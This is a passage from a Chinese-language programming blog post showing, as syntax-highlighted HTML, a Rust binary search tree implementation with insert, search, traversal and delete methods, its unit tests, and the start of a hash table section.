                <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>value <span class="token punctuation">:</span> value<span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>left<span class="token punctuation">&#123;</span>
                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>value <span class="token punctuation">:</span> value<span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">search</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> target <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> depth <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>value <span class="token punctuation">&#123;</span>
            val <span class="token keyword">if</span> val <span class="token operator">==</span> target <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span><span class="token punctuation">,</span>
            val <span class="token keyword">if</span> val <span class="token operator">&lt;</span> target <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 去右子树找</span>
                <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            val <span class="token keyword">if</span> val <span class="token operator">></span> target <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 去左子树找</span>
                <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            _ <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">None</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> depth <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
            r<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">let</span> spaces <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>depth <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;&#123;&#125;"</span><span class="token punctuation">,</span> spaces<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
            l<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
            l<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
            r<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">in_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
            l<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>
            r<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">delete</span><span class="token punctuation">(</span>root<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">,</span> target <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> node <span class="token operator">=</span> root<span class="token operator">?</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> v <span class="token operator">=</span> node<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">if</span> v <span class="token operator">&lt;</span> target <span class="token punctuation">&#123;</span>
            node<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> v <span class="token operator">></span> target <span class="token punctuation">&#123;</span>
            node<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> v <span class="token operator">==</span> target <span class="token punctuation">&#123;</span>
            <span class="token keyword">match</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>right<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 无子节点</span>
                <span class="token punctuation">(</span><span class="token class-name">None</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token class-name">None</span><span class="token punctuation">,</span>
                <span class="token comment">// 只有一个子节点</span>
                <span class="token punctuation">(</span>left <span class="token operator">@</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span> <span class="token operator">=></span> left<span class="token punctuation">,</span>
                <span class="token punctuation">(</span><span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token operator">@</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=></span> right<span class="token punctuation">,</span>
                <span class="token comment">// 有两个子节点可以用左子树的最大节点或右子树的最小节点替换，或者直接用左孩子替换再把右子树接到末尾</span>
                <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">let</span> min_val <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">min_value</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">let</span> <span class="token keyword">mut</span> new_node <span class="token operator">=</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
                        value<span class="token punctuation">:</span> min_val<span class="token punctuation">,</span>
                        left<span class="token punctuation">:</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span>
                        right<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment">// 删除右子树中的最小节点</span>
                    new_node<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">,</span> min_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">Some</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>

            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">None</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">min_value</span><span class="token punctuation">(</span>node<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">i32</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> node<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>current<span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>
            current <span class="token operator">=</span> left<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        current<span class="token punctuation">.</span>value
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>两层结构体，SearchTree对所有功能进行了一次封装</p>
<p>大部分实现都很常规，唯一麻烦的是删除操作，虽然递归的所有权问题很麻烦，但依然要比遍历看着简单</p>
<p>还有min_value也是一种妥协，如果要返回Option<Node>会遇到复杂的生命周期问题，所以就返回一个值用到再创建就好了</p>
<p>测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">SearchTree</span><span class="token punctuation">;</span>

    <span class="token comment">//#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_insert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> tree <span class="token operator">=</span> <span class="token class-name">SearchTree</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> nums <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        tree<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> tree <span class="token operator">=</span> <span class="token class-name">SearchTree</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> nums <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        tree<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>
        tree<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tree<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> tree <span class="token operator">=</span> <span class="token class-name">SearchTree</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 插入和搜索</span>
        tree<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 删除叶子节点</span>
        tree<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 删除有一个子节点的节点</span>
        tree<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 删除有两个子节点的节点</span>
        tree<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 验证树仍然有效</span>
        tree<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tree<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>没规定哈希表的大小，凭直觉填45了</p>
<p>基本实现：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">MyHash</span><span class="token punctuation">&#123;</span>
    data <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token operator">>></span><span class="token punctuation">,</span>
    len <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">MyHash</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">MyHash</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> len <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>
